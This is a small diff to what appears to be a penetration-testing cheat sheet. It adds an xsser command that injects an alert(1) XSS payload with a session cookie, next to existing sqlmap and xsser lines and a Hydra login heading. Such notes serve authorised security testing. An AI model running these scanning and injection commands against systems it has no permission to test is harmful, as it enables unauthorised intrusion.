@@ -85,7 +85,7 @@ sqlmap -r file -p request_variable
 xsser --url url -p payload #in payload include XSS on payload field
 xsser --url url -p payload --auto
 xsser --url url -p payload --Fp custom_payload #in payload include XSS on payload field
-
+ xsser --url “URL” --cookie=”COOKIE” --Fp “<script>alert(1)</script>”
 ```
 
 ## Hydra Login 
